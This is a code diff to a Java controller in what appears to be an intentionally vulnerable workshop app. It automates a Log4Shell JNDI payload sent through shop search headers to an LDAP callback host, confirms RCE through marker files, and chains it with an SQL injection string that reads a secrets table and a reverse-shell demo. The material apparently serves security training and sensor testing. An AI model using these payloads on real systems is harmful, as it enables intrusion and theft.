@@ -115,8 +115,12 @@ public class ShopController {
     return out;
   }
 
-  /** Same HTTP shape as typing SQLi into the shop search box. */
-  private String replayShopSearch(String payload) {
+  /** Same HTTP shape as typing into the shop search box (optional Log4Shell headers). */
+  private String replayShopSearch(String q) {
+    return replayShopSearch(q, null, null);
+  }
+
+  private String replayShopSearch(String q, String userAgent, String apiVersion) {
     int port = 8080;
     try {
       String envPort = System.getenv("SERVER_PORT");
@@ -131,20 +135,28 @@ public class ShopController {
     } catch (Exception ignored) {
     }
     String url = "http://127.0.0.1:" + port + "/search?q="
-        + java.net.URLEncoder.encode(payload, StandardCharsets.UTF_8);
+        + java.net.URLEncoder.encode(q, StandardCharsets.UTF_8);
     try {
       java.net.HttpURLConnection conn = (java.net.HttpURLConnection) java.net.URI.create(url)
           .toURL()
           .openConnection();
       conn.setRequestMethod("GET");
       conn.setConnectTimeout(3000);
-      conn.setReadTimeout(8000);
-      conn.setRequestProperty("User-Agent", "TraditionalJay-PoC/1.0 (shop-search-replay)");
+      conn.setReadTimeout(10000);
+      conn.setRequestProperty(
+          "User-Agent",
+          userAgent != null && !userAgent.isBlank()
+              ? userAgent
+              : "TraditionalJay-PoC/1.0 (shop-search-replay)"
+      );
+      if (apiVersion != null && !apiVersion.isBlank()) {
+        conn.setRequestProperty("X-Api-Version", apiVersion);
+      }
       conn.setRequestProperty("Accept", "text/html");
       conn.getResponseCode();
       conn.disconnect();
     } catch (Exception e) {
-      log.warn("Shop search replay failed (SQLi still runs in-process): " + e.getMessage());
+      log.warn("Shop search replay failed: " + e.getMessage());
     }
     return url;
   }
@@ -152,55 +164,104 @@ public class ShopController {
   @PostMapping("/api/demo/log4shell")
   @ResponseBody
   public Map<String, Object> log4shellDemo(
-      @RequestParam(name = "callback", defaultValue = "127.0.0.1:1389") String callback
+      @RequestParam(name = "callback", defaultValue = "127.0.0.1:1389") String callback,
+      @RequestParam(name = "via", defaultValue = "search") String via
   ) throws Exception {
     String host = sanitizeHostPort(callback, "127.0.0.1:1389");
     String payload = "${jndi:ldap://" + host + "/TraditionalJay}";
+    boolean viaSearch = !"direct".equalsIgnoreCase(via);
 
-    // JNDI LDAP can block for a long TCP timeout if the callback host is unreachable
-    // (e.g. Mac firewall). Run the lookup with a hard deadline so /security doesn't hang.
-    boolean lookupFinished = false;
-    String lookupError = null;
-    java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
-      Thread t = new Thread(r, "log4shell-jndi");
-      t.setDaemon(true);
-      return t;
-    });
-    try {
-      java.util.concurrent.Future<?> fut = pool.submit(() -> log.error("Log4Shell workshop probe: " + payload));
-      try {
-        fut.get(6, TimeUnit.SECONDS);
-        lookupFinished = true;
-      } catch (java.util.concurrent.TimeoutException te) {
-        fut.cancel(true);
-        lookupError = "JNDI LDAP lookup timed out after 6s — VM could not reach " + host
-            + ". Use callback 127.0.0.1:1389 (on-box attacker) or open inbound tcp/1389+8000 on your laptop.";
-        log.warn(lookupError);
-      }
-    } catch (Exception e) {
-      lookupError = e.getMessage();
-    } finally {
-      pool.shutdownNow();
-    }
-
-    Thread.sleep(lookupFinished ? 4000 : 200);
     Path marker = Path.of("/tmp/jss-log4shell-rce");
     Path idFile = Path.of("/tmp/jss-log4shell-id.txt");
-    boolean rceConfirmed = Files.exists(marker);
+    try {
+      Files.deleteIfExists(marker);
+      Files.deleteIfExists(idFile);
+    } catch (Exception ignored) {
+    }
+
+    // Prefer the real shop sink (GET /search logs User-Agent / q with Log4j) so HTTP
+    // sensors match manual browsing — not only POST /api/demo/log4shell.
+    String shopUrl = null;
+    if (viaSearch) {
+      shopUrl = replayShopSearch("boards", payload, payload);
+    }
+
+    boolean lookupFinished = false;
+    String lookupError = null;
+    if (!viaSearch) {
+      java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
+        Thread t = new Thread(r, "log4shell-jndi");
+        t.setDaemon(true);
+        return t;
+      });
+      try {
+        java.util.concurrent.Future<?> fut = pool.submit(() -> log.error("Log4Shell workshop probe: " + payload));
+        try {
+          fut.get(6, TimeUnit.SECONDS);
+          lookupFinished = true;
+          Thread.sleep(2500);
+        } catch (java.util.concurrent.TimeoutException te) {
+          fut.cancel(true);
+          lookupError = "JNDI LDAP lookup timed out after 6s — VM could not reach " + host;
+          log.warn(lookupError);
+        }
+      } catch (Exception e) {
+        lookupError = e.getMessage();
+      } finally {
+        pool.shutdownNow();
+      }
+    } else {
+      // /search already logged the JNDI headers — wait for LDAP + Exploit.class.
+      Thread.sleep(4500);
+      lookupFinished = true;
+    }
+
+    Path markerCheck = Path.of("/tmp/jss-log4shell-rce");
+    Path idFileCheck = Path.of("/tmp/jss-log4shell-id.txt");
+    boolean rceConfirmed = Files.exists(markerCheck);
     String idOutput = "";
-    if (Files.exists(idFile)) {
-      idOutput = Files.readString(idFile, StandardCharsets.UTF_8).trim();
+    if (Files.exists(idFileCheck)) {
+      idOutput = Files.readString(idFileCheck, StandardCharsets.UTF_8).trim();
+    }
+
+    // If HTTP path didn't land RCE (timing), one direct fallback for workshop reliability.
+    if (viaSearch && !rceConfirmed) {
+      java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
+        Thread t = new Thread(r, "log4shell-jndi-fallback");
+        t.setDaemon(true);
+        return t;
+      });
+      try {
+        java.util.concurrent.Future<?> fut = pool.submit(() -> log.error("Log4Shell workshop probe: " + payload));
+        try {
+          fut.get(6, TimeUnit.SECONDS);
+          Thread.sleep(2500);
+        } catch (java.util.concurrent.TimeoutException te) {
+          fut.cancel(true);
+          lookupError = "Shop /search JNDI did not confirm RCE; direct fallback also timed out for " + host;
+        }
+      } finally {
+        pool.shutdownNow();
+      }
+      rceConfirmed = Files.exists(markerCheck);
+      if (Files.exists(idFileCheck)) {
+        idOutput = Files.readString(idFileCheck, StandardCharsets.UTF_8).trim();
+      }
     }
 
     Map<String, Object> out = new LinkedHashMap<>();
     out.put("exploited", true);
     out.put("rce_confirmed", rceConfirmed);
-    out.put("jndi_lookup_finished", lookupFinished);
+    out.put("jndi_lookup_finished", lookupFinished || rceConfirmed);
+    out.put("via", viaSearch ? "search" : "direct");
+    if (shopUrl != null) {
+      out.put("http_replay", shopUrl);
+    }
     if (lookupError != null) {
       out.put("jndi_error", lookupError);
     }
-    out.put("rce_marker", marker.toString());
-    out.put("id_file", idFile.toString());
+    out.put("rce_marker", markerCheck.toString());
+    out.put("id_file", idFileCheck.toString());
     out.put("id_output", idOutput);
     out.put("cve", "CVE-2021-44228");
     out.put("name", "Log4Shell");
@@ -208,19 +269,20 @@ public class ShopController {
     out.put("payload", payload);
     out.put("callback", host);
     out.put("ldap_server",
-        "Prefer on-box: leave callback 127.0.0.1:1389 (cloud-init starts tools/run-log4shell-onbox.sh). "
-            + "Or run ./tools/run-log4shell-ldap.sh on a reachable attacker host.");
+        "Prefer on-box: leave callback 127.0.0.1:1389. PoC uses GET /search with JNDI User-Agent "
+            + "(same as manual shop traffic).");
     out.put("narrative",
         rceConfirmed
-            ? "Log4j JNDI triggered remote Exploit.class — RCE marker on the VM."
+            ? "Log4Shell via GET /search (User-Agent / X-Api-Version JNDI) — RCE marker on the VM."
             : lookupError != null
                 ? lookupError
-                : "JNDI LDAP lookup fired. For full RCE, ensure on-box LDAP is up (systemctl status traditionaljay-log4shell) "
-                    + "or point callback at a reachable marshalsec host.");
+                : "JNDI injected through shop /search headers. Ensure on-box LDAP is up "
+                    + "(systemctl status traditionaljay-log4shell).");
     out.put("signals", List.of(
+        "HTTP GET /search with JNDI in User-Agent",
         "Java process on VM",
         "Outbound LDAP (tcp/1389) for JNDI",
-        rceConfirmed ? "RCE via Log4Shell (marker file on host)" : "JNDI lookup (check on-box attacker / firewall)",
+        rceConfirmed ? "RCE via Log4Shell (marker file on host)" : "JNDI lookup (check on-box attacker)",
         "Log4j 2.14.1 SCA finding"
     ));
     return out;
@@ -287,7 +349,7 @@ public class ShopController {
     List<Map<String, Object>> steps = new ArrayList<>();
     steps.add(sqliDemo("' UNION SELECT id,k,v,v FROM secrets--"));
     Thread.sleep(2000);
-    steps.add(log4shellDemo(ldapCallback));
+    steps.add(log4shellDemo(ldapCallback, "search"));
     Thread.sleep(2000);
     steps.add(reverseShellDemo(c2Callback));
 
